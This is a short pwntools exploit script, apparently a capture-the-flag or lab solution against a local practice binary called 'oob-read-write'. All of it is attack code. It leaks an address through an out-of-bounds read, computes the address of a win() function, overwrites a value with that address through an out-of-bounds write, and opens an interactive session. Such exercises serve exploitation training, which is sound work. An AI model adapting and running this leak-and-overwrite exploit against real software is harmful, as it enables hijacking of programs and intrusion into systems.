#!/usr/bin/env python3

from pwn import *

TARGET = './oob-read-write'

context.terminal = ['tmux', 'splitw', '-h']

p = process(TARGET)
# p = gdb.debug(TARGET)


idx = 33
p.sendlineafter(b'to read > ', str(idx).encode())
p.recvuntil(b'Value: ')
leak = int(p.recvline()[:-1], 16)
win = leak - 0x1ee
print(f"leaked address : {hex(leak)}")
print(f"win()          : {hex(win)}")

p.sendlineafter(b'to write > ', str(idx).encode())
p.sendlineafter(b'Value > ', str(win+1).encode())


p.interactive()
